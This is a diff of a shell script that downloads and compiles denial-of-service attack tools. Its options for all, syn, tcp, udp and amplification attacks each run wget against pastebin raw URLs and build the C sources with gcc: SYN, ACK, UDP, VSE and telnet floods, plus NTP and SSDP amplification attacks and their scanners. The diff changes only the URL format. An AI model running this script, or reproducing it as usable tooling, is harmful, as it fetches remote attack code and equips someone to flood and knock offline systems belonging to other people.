@@ -20,101 +20,101 @@ while test $# -gt 0; do
         case "$1" in
                 -all|-a)
                                 echo "Downloading All Attack Sources With Amp Sources"
-                                wget -q http://pastebin.com/raw.php?i=NwML59s9 -O flood.c
+                                wget -q https://pastebin.com/raw/NwML59s9 -O flood.c
                                 gcc -o flood flood.c
-                                wget -q http://pastebin.com/raw.php?i=c1JhexCa -O essyn.c
+                                wget -q https://pastebin.com/raw/c1JhexCa -O essyn.c
                                 gcc -pthread essyn.c -o essyn
-                                wget -q http://pastebin.com/raw.php?i=YUYG8J0H -O rssyn.c
+                                wget -q https://pastebin.com/raw/YUYG8J0H -O rssyn.c
                                 gcc -pthread rssyn.c -o rssyn.c
-                                wget -q http://pastebin.com/raw.php?i=5Nm9zA2c -O xsyn.c
+                                wget -q https://pastebin.com/raw/5Nm9zA2c -O xsyn.c
                                 gcc -pthread xsyn.c -o xsyn
-                                wget -q http://pastebin.com/raw.php?i=6bG6Zxam -O syn.c
+                                wget -q https://pastebin.com/raw/6bG6Zxam -O syn.c
                                 gcc -pthread syn.c -o syn
-                                wget -q http://pastebin.com/raw.php?i=BuNVxPk2 -O dominate.c
+                                wget -q https://pastebin.com/raw/BuNVxPk2 -O dominate.c
                                 gcc -pthread dominate.c -o dominate
-                                wget -q http://pastebin.com/raw.php?i=mb1wUd8g -O ack.c
+                                wget -q https://pastebin.com/raw/mb1wUd8g -O ack.c
                                 gcc -pthread ack.c -o ack
-                                wget -q http://pastebin.com/raw.php?i=P6BeNUqk -O sack.c
+                                wget -q https://pastebin.com/raw/P6BeNUqk -O sack.c
                                 gcc -pthread sack.c -o sack
-                                wget -q http://pastebin.com/raw.php?i=FqLfy2hg -O zap.c
+                                wget -q https://pastebin.com/raw/FqLfy2hg -O zap.c
                                 gcc -pthread zap.c -o zap
-                                wget -q http://pastebin.com/raw.php?i=PgBV1RVF -O xack.c
+                                wget -q https://pastebin.com/raw/PgBV1RVF -O xack.c
                                 gcc -pthread xack.c -o xack
-                                wget -q http://pastebin.com/raw.php?i=hgjgXcjJ -O std.c
+                                wget -q https://pastebin.com/raw/hgjgXcjJ -O std.c
                                 gcc -o std std.c
-                                wget -q http://pastebin.com/raw.php?i=2iJ3ESBi -O rawudp.c
+                                wget -q https://pastebin.com/raw/2iJ3ESBi -O rawudp.c
                                 gcc -pthread rawudp.c -o rawudp
-                                wget -q http://pastebin.com/raw.php?i=cHKJW7g2 -O vse.c
+                                wget -q https://pastebin.com/raw/cHKJW7g2 -O vse.c
                                 gcc -pthread vse.c -o vse
-                                wget -q http://pastebin.com/raw.php?i=UP5crmZ1 -O telnet.c
+                                wget -q https://pastebin.com/raw/UP5crmZ1 -O telnet.c
                                 gcc -pthread telnet.c -o telnet
-                                wget -q http://pastebin.com/raw.php?i=CrXHvNw0 -O ntp.c
+                                wget -q https://pastebin.com/raw/CrXHvNw0 -O ntp.c
                                 gcc -pthread ntp.c -o ntp
-                                wget -q http://pastebin.com/raw.php?i=ztY4hMh1 -O ntp_scanner.c
+                                wget -q https://pastebin.com/raw/ztY4hMh1 -O ntp_scanner.c
                                 gcc -pthread ntp_scanner.c -o ntp_scanner
-                                wget -q http://pastebin.com/raw.php?i=r2z67WD5 -O ssdp.c
+                                wget -q https://pastebin.com/raw/r2z67WD5 -O ssdp.c
                                 gcc -pthread ssdp.c -o ssdp
-                                wget -q http://pastebin.com/raw.php?i=i15hAcZG -O ssdp_scanner.c
+                                wget -q https://pastebin.com/raw/i15hAcZG -O ssdp_scanner.c
                                 gcc -pthread ssdp_scanner.c -o ssdp_scanner
                                 rm -rf *.c
                                 exit 0
                         ;;
                 -syn|-s)
                                 echo "Downloading All syn Based Attack Sources"
-                                wget -q http://pastebin.com/raw.php?i=c1JhexCa -O essyn.c
+                                wget -q https://pastebin.com/raw/c1JhexCa -O essyn.c
                                 gcc -pthread essyn.c -o essyn
-                                wget -q http://pastebin.com/raw.php?i=YUYG8J0H -O rssyn.c
+                                wget -q https://pastebin.com/raw/YUYG8J0H -O rssyn.c
                                 gcc -pthread rssyn.c -o rssyn.c
-                                wget -q http://pastebin.com/raw.php?i=5Nm9zA2c -O xsyn.c
+                                wget -q https://pastebin.com/raw/5Nm9zA2c -O xsyn.c
                                 gcc -pthread xsyn.c -o xsyn
-                                wget -q http://pastebin.com/raw.php?i=6bG6Zxam -O syn.c
+                                wget -q https://pastebin.com/raw/6bG6Zxam -O syn.c
                                 gcc -pthread syn.c -o syn
-                                wget -q http://pastebin.com/raw.php?i=NwML59s9 -O flood.c
+                                wget -q https://pastebin.com/raw/NwML59s9 -O flood.c
                                 gcc -o flood flood.c
                                 rm -rf *.c
                                 exit 0
                         ;;
                                 -tcp|-t)
                                 echo "Downloading All tcp Based Attack Sources"
-                                wget -q http://pastebin.com/raw.php?i=BuNVxPk2 -O dominate.c
+                                wget -q https://pastebin.com/raw/BuNVxPk2 -O dominate.c
                                 gcc -pthread dominate.c -o dominate
-                                wget -q http://pastebin.com/raw.php?i=mb1wUd8g -O ack.c
+                                wget -q https://pastebin.com/raw/mb1wUd8g -O ack.c
                                 gcc -pthread ack.c -o ack
-                                wget -q http://pastebin.com/raw.php?i=P6BeNUqk -O sack.c
+                                wget -q https://pastebin.com/raw/P6BeNUqk -O sack.c
                                 gcc -pthread sack.c -o sack
-                                wget -q http://pastebin.com/raw.php?i=FqLfy2hg -O zap.c
+                                wget -q https://pastebin.com/raw/FqLfy2hg -O zap.c
                                 gcc -pthread zap.c -o zap
-                                wget -q http://pastebin.com/raw.php?i=PgBV1RVF -O xack.c
+                                wget -q https://pastebin.com/raw/PgBV1RVF -O xack.c
                                 gcc -pthread xack.c -o xack
-                                wget -q http://pastebin.com/raw.php?i=NwML59s9 -O flood.c
+                                wget -q https://pastebin.com/raw/NwML59s9 -O flood.c
                                 gcc -o flood flood.c
                                 rm -rf *.c
                                 exit 0
                                                 ;;
                                 -udp|-u)
                                 echo "Downloading All udp Based Attack Sources"
-                                wget -q http://pastebin.com/raw.php?i=hgjgXcjJ -O std.c
+                                wget -q https://pastebin.com/raw/hgjgXcjJ -O std.c
                                 gcc -o std std.c
-                                wget -q http://pastebin.com/raw.php?i=2iJ3ESBi -O rawudp.c
+                                wget -q https://pastebin.com/raw/2iJ3ESBi -O rawudp.c
                                 gcc -pthread rawudp.c -o rawudp
-                                wget -q http://pastebin.com/raw.php?i=cHKJW7g2 -O vse.c
+                                wget -q https://pastebin.com/raw/cHKJW7g2 -O vse.c
                                 gcc -pthread vse.c -o vse
-                                wget -q http://pastebin.com/raw.php?i=UP5crmZ1 -O telnet.c
+                                wget -q https://pastebin.com/raw/UP5crmZ1 -O telnet.c
                                 gcc -pthread telnet.c -o telnet
-                                wget -q http://pastebin.com/raw.php?i=NwML59s9 -O flood.c
+                                wget -q https://pastebin.com/raw/NwML59s9 -O flood.c
                                 gcc -o flood flood.c
                                 rm -rf *.c
                                 exit 0
                                                 ;;
                                 -amp|-A)
                                 echo "Downloading All amp Based Attack Sources And Scanner Sources"
-                                wget -q http://pastebin.com/raw.php?i=CrXHvNw0 -O ntp.c
+                                wget -q https://pastebin.com/raw/CrXHvNw0 -O ntp.c
                                 gcc -pthread ntp.c -o ntp
-                                wget -q http://pastebin.com/raw.php?i=ztY4hMh1 -O ntp_scanner.c
+                                wget -q https://pastebin.com/raw/ztY4hMh1 -O ntp_scanner.c
                                 gcc -pthread ntp_scanner.c -o ntp_scanner
-                                wget -q http://pastebin.com/raw.php?i=r2z67WD5 -O ssdp.c
+                                wget -q https://pastebin.com/raw/r2z67WD5 -O ssdp.c
                                 gcc -pthread ssdp.c -o ssdp
-                                wget -q http://pastebin.com/raw.php?i=i15hAcZG -O ssdp_scanner.c
+                                wget -q https://pastebin.com/raw/i15hAcZG -O ssdp_scanner.c
                                 gcc -pthread ssdp_scanner.c -o ssdp_scanner
                                 rm -rf *.c
                                 exit 0
